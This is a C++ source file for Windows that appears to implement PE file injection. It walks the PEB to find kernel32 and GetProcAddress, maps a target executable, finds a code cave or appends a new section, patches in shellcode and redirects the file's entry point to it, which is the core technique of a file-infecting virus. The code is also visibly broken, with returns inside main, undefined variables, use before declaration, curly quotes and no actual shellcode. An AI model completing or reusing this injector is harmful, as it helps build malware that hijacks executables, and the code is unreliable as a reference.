#include <iostream>
#include <stdio.h>
#include <Windows.h>
#include <WinUser.h>

using namespace std;

int main(int argc, char* argv[])
{
    //the target file is initiated here.
    const int MAX_FILEPATH = 255;
    char lpFileName[MAX_FILEPATH] = { "C:\benign\benign\1aa177b92c99b9458b270907d65d5687af48385fbbf42c3aef9b69d61d284721.exe" }; //sample no26   

    //code cave creation - in this step, a codecave is built, and a generalistic address is made for later editing.
    PEB* peb;
    __asm {
        mov eax, fs: [0x30]
        mov peb, eax
    }

    PEB_LDR_DATA* ldr = *(PEB_LDR_DATA**)((DWORD)peb + 0x0C);
    LIST_ENTRY* head = *(LIST_ENTRY**)((DWORD)ldr + 0x14);
    LIST_ENTRY* entry = head->Flink;

    while (entry != head) {
        LDR_DATA_TABLE_ENTRY* module = *(LDR_DATA_TABLE_ENTRY**)((DWORD)entry + 0x08);
        USHORT length = *(USHORT*)((DWORD)module + 0x24);
        WCHAR* buffer = *(WCHAR**)((DWORD)module + 0x28);
        if (length == 24 && wcsncmp(buffer, L”kernel32.dll”, 12) == 0) {
            return *(HMODULE*)((DWORD)module + 0x18);
        }
        entry = entry->Flink;
    }

    //the essential header info is gathered here.
    HMODULE kernel32 = GetKernel32Base();
    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)kernel32;
    PIMAGE_NT_HEADERS pNtHeader = (PIMAGE_NT_HEADERS)((DWORD)kernel32 + *(DWORD*)(pDosHeader + 0x3c));
    PIMAGE_EXPORT_DIRECTORY pExpTable = (PIMAGE_EXPORT_DIRECTORY)((DWORD)kernel32 + pNtHeader + 0x78);
    PDWORD name_table = (PDWORD)((DWORD)kernel32 + pExpTable + 0x20);
    PWORD ordinal_table = (PWORD)((DWORD)kernel32 + pExpTable + 0x24);
    PDWORD address_table = (PDWORD)((DWORD)kernel32 + pExpTable + 0x1c);

    for (int i = 0; i < exp->NumberOfNames; i++) {
        char* name = (char*)((DWORD)kernel32 + name_table[i]);
        if (strcmp(name, “GetProcAddress”) == 0) {
            WORD ordinal = ordinal_table[i];
            DWORD address = address_table[ordinal];
            return (FARPROC)((DWORD)kernel32 + address);
        }
    }
    
    //the shellcode is then edited, primarily for replacing the generalistic address.
    PIMAGE_DOS_HEADER pDosHdr = (PIMAGE_DOS_HEADER)lpFileAddr;
    PIMAGE_NT_HEADERS pNtHdrs = (PIMAGE_NT_HEADERS)(lpFileAddr + pDosHdr->e_lfanew);
    PIMAGE_SECTION_HEADER pSecHdr = (PIMAGE_SECTION_HEADER)IMAGE_FIRST_SECTION(pNtHdrs);
    DWORD dwOEP = pNtHdrs->OptionalHeader.AddressOfEntryPoint;

    for (DWORD i = 0; i < dwShellSize; i++) {
        if (*((LPDWORD)(shellcode + i)) == 0xaaaaaaaa) {
            *((LPDWORD)(shellcode + i)) = dwOEP;
            break;
        }
    }

    //the file is opened here.
    HANDLE hFile = CreateFileA(
        lpFileName,
        FILE_READ_ACCESS | FILE_WRITE_ACCESS,
        0,
        NULL,
        OPEN_ALWAYS,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );
    DWORD dwFileSize = GetFileSize(hFile, NULL);
    HANDLE hFileMapping = CreateFileMapping(
        hFile,
        NULL,
        PAGE_READWRITE,
        0,
        dwFileSize,
        NULL
    );
    LPBYTE lpFileAddr = (LPBYTE)MapViewOfFile(
        hFileMapping,
        FILE_MAP_READ | FILE_MAP_WRITE,
        0,
        0,
        dwFileSize
    );
    
    //the code cave spot is being serached, and the first found is set to be the plugging pt.
    DWORD dwCount = 0;
    DWORD dwPos;
    LPVOID lpShellAddr = 0;
    for (dwPos = pNtHdrs->OptionalHeader.SizeOfHeaders; dwPos < dwFileSize; dwPos++)
    {
        if (*(lpFileAddr + dwPos) == 0x00) {
            if (dwCount++ == dwShellSize)
            {
                lpShellAddr = (LPVOID)(lpFileAddr + dwPos – dwShellSize);
                break;
            }
        }
        else {
            dwCount = 0;
        }
    }

    //if there are no favourable spot, another section for that is created.
    DWORD dwNewSecRVA = 0, dwNewSecRaw = 0;
    if (!lpShellAddr) {
        while (pSecHdr->SizeOfRawData != 0) {
            pSecHdr++;
        }
        dwNewSecRVA = pSecHdr->VirtualAddress + pSecHdr->Misc.VirtualSize;
        dwNewSecRaw = pSecHdr->PointerToRawData + pSecHdr->SizeOfRawData;
        pNtHdrs->FileHeader.NumberOfSections++;
        strncpy((char*)pSecHdr->Name, “. / 001”, IMAGE_SIZEOF_SHORT_NAME);
        pNtHdrs->OptionalHeader.SizeOfImage += pNtHdrs->OptionalHeader.SectionAlignment;
        pSecHdr->SizeOfRawData = pNtHdrs->OptionalHeader.FileAlignment;
        pSecHdr->Misc.VirtualSize = pNtHdrs->OptionalHeader.SectionAlignment;
        pSecHdr->PointerToRawData = dwNewSecRaw;
        pSecHdr->VirtualAddress = dwNewSecRVA;
        ZeroMemory((LPVOID)(
            (DWORD)lpFileAddr + dwNewSecRaw),
            pNtHdrs->OptionalHeader.FileAlignment
        );
        lpShellAddr = (LPVOID)(lpFileAddr + dwNewSecRaw);
        printf(“[+] Added section % s”, pSecHdr->Name);
    }

    //the pe file info in the targeted section is altered for its sake...
    pSecHdr[i].Misc.VirtualSize += dwShellSize;
    pSecHdr[i].Characteristics |= IMAGE_SCN_MEM_WRITE | IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_EXECUTE;
    pNtHdrs->OptionalHeader.AddressOfEntryPoint = shellOffset – pSecHdr[i].PointerToRawData + pSecHdr[i].VirtualAddress;

    //exiting
    return 0;
}

//credentials: https://sec.vnpt.vn/2023/05/pe-injection/, https://sec.vnpt.vn/2023/07/tim-dia-chi-kernel32-dll-va-cac-ham-api/ 